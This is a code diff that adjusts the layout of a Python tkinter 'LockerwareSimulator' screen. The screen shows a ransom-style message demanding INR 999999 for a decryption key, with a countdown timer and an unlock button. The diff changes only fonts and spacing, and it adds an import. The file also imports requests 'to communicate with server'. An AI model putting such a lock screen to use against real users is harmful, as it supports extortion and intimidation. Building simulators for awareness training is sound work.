@@ -2,6 +2,7 @@ import tkinter as tk
 import time
 import threading
 import os
+import sys
 import base64
 import requests # Added to communicate with server
 
@@ -49,36 +50,36 @@ class LockerwareSimulator:
         title = tk.Label(
             self.root,
             text=("YOUR SYSTEM HAS BEEN LOCKED😝\n\n"
-                "TO UNLOCK TRANSFER AMOUNT INR 999999/- ONLY\n\n"
+                "TO UNLOCK TRANSFER AMOUNT INR 999999/- ONLY"
             ),
             fg="red",
             bg="black",
-            font=("Arial", 40, "bold")
+            font=("Arial", 28, "bold")
         )
-        title.pack(pady=30)
+        title.pack(pady=(20, 10))
 
         msg = tk.Label(
             self.root,
             text=(
-                "All your system access has been restricted.\n\n"
-                "To regain access, enter the decryption key.\n\n"
+                "All your system access has been restricted.\n"
+                "To regain access, enter the decryption key.\n"
                 "Failure to do so will result in permanent lock."
             ),
             fg="white",
             bg="black",
-            font=("Arial", 18),
+            font=("Arial", 14),
             justify="center"
         )
-        msg.pack(pady=20)
+        msg.pack(pady=10)
 
         self.timer_label = tk.Label(
             self.root,
             text="Time Left: --:--",
             fg="yellow",
             bg="black",
-            font=("Arial", 22)
+            font=("Arial", 20)
         )
-        self.timer_label.pack(pady=20)
+        self.timer_label.pack(pady=10)
 
         key_label = tk.Label(
             self.root,
@@ -100,14 +101,14 @@ class LockerwareSimulator:
         unlock_btn = tk.Button(
             self.root,
             text="UNLOCK SYSTEM",
-            font=("Arial", 16, "bold"),
+            font=("Arial", 14, "bold"),
             bg="red",
             fg="white",
-            padx=40,
-            pady=10,
+            padx=30,
+            pady=8,
             command=self.check_key
         )
-        unlock_btn.pack(pady=20)
+        unlock_btn.pack(pady=15)
 
         self.status_label = tk.Label(
             self.root,
